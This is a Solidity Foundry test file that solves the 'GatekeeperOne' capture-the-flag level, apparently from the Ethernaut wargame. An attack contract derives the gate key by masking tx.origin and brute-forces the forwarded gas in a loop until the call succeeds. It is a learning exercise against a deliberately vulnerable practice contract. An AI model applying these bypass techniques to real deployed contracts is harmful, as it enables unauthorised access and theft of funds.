// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../instance/Level13.sol";

contract ExploitLevel13 is Test {
    GatekeeperOne instance = new GatekeeperOne();
    AttackGatekeeperOne attackG1;

    function setUp() external {
        attackG1 = new AttackGatekeeperOne(instance);
    }

    function testExploit() external {
        attackG1.attack();
    }
}

contract AttackGatekeeperOne {
    GatekeeperOne instance;

    constructor(GatekeeperOne _instance) {
        instance = _instance;
    }

    function attack() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8192; i++) {
            (bool success,) =
                address(instance).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            console.log("i:", i);
            if (success) break;
        }
    }
}
